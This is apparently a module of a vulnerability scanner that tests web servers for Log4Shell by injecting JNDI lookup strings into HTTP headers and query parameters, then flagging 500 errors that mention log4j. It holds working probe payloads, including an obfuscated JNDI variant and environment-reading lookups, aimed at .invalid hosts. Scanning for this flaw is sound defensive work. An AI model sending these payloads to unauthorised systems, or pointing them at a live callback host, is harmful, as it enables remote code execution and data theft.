"""Log4Shell + generic log injection probe.

Sends JNDI/template strings via headers and parameters. We can't observe
out-of-band callbacks here, but we *can* flag servers that throw 500 or
echo the payload (sign of vulnerable parser).
"""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://cyberloka-probe.invalid/x}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.invalid/y}",
    "${env:USER}",
    "${sys:user.home}",
]
HEADERS_TO_TEST = [
    "User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version",
    "X-Forwarded-Host", "X-Real-IP",
]


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # 1. Header injection
        for header in HEADERS_TO_TEST:
            for payload in LOG4SHELL_PAYLOADS[:2]:
                r = client.get(target.base_url, headers={header: payload})
                if r is None:
                    continue
                # 500 or stack trace = parser tried to evaluate
                body = (r.text or "")
                if r.status_code == 500 and any(
                    s in body.lower() for s in ("naming", "lookup", "log4j", "jndi", "javax")
                ):
                    findings.append(Finding(
                        module="log_injection", target=target.base_url,
                        title=f"Header `{header}` mungkin diproses oleh log4j vulnerable",
                        severity=Severity.CRITICAL,
                        description=("Mengirim payload JNDI lewat header memicu error 500 dengan "
                                     "kata kunci JNDI/log4j. Bisa jadi target rentan Log4Shell."),
                        evidence=f"{header}: {payload} -> 500 with naming/lookup error",
                        cwe="CWE-117",
                        remediation=("Upgrade log4j ke >= 2.17.1, atau set "
                                     "`log4j2.formatMsgNoLookups=true`. Audit semua dependency Java."),
                        references=["https://logging.apache.org/log4j/2.x/security.html"],
                    ))
                    return findings

        # 2. Param injection
        s = get_state(config)
        if s:
            for url in s.param_urls[:5]:
                parsed = urlparse(url)
                params = list(parse_qsl(parsed.query))
                if not params:
                    continue
                k0 = params[0][0]
                for payload in LOG4SHELL_PAYLOADS[:1]:
                    new_params = [(k0, payload)] + params[1:]
                    mutated = urlunparse(parsed._replace(query=urlencode(new_params)))
                    r = client.get(mutated)
                    if r is None:
                        continue
                    body = (r.text or "")
                    # Echo / 500 with JNDI keyword
                    if r.status_code == 500 and any(
                        s_ in body.lower() for s_ in ("jndi", "log4j", "naming")
                    ):
                        findings.append(Finding(
                            module="log_injection", target=mutated,
                            title=f"Parameter `{k0}` memicu error log4j",
                            severity=Severity.CRITICAL,
                            description="Payload JNDI di param menyebabkan 500 + jejak log4j.",
                            evidence=f"{k0}={payload} -> 500", cwe="CWE-117",
                            remediation="Sama dengan Log4Shell: upgrade log4j.",
                        ))
                        return findings
    finally:
        client.close()
    return findings
